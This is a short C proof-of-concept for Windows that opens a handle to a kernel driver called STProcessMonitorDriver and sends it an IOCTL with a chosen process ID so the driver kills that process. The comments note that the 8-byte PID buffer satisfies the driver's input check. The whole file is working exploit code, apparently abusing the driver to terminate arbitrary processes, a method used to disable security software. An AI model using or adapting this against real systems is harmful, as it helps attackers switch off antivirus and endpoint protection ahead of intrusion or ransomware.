#include <stdio.h>
#include <windows.h>
#include <winnt.h>

#define IOCTL_KILL_PROCESS 0xB822200C

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    UINT64 targetPid = 0;
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;

    hDevice = CreateFileA(
        "\\\\.\\STProcessMonitorDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open a handle to the driver. Error: %lu\n", GetLastError());
        return -1;
    }

    printf("[+] Successfully connected to the driver.\n");
    printf("Enter the Process ID (PID) to terminate: ");
    
    if (scanf("%llu", &targetPid) != 1) {
        printf("[-] Invalid input.\n");
        CloseHandle(hDevice);
        return -1;
    }

    printf("[*] Sending IOCTL 0x%lX to terminate PID %llu...\n", IOCTL_KILL_PROCESS, targetPid);

    // Send the IOCTL to the driver.
    // The input buffer is the address of our 64-bit PID variable.
    // The input buffer size will be 8 bytes, satisfying the driver's check.
    bResult = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &targetPid,          // Input buffer (the 8-byte PID)
        sizeof(targetPid),   // Input buffer size (will be 8)
        NULL,                // Output buffer (not used)
        0,                   // Output buffer size
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return -1;
    }

    printf("[+] Success! The IOCTL was sent.\n");
    CloseHandle(hDevice);
    return 0;
}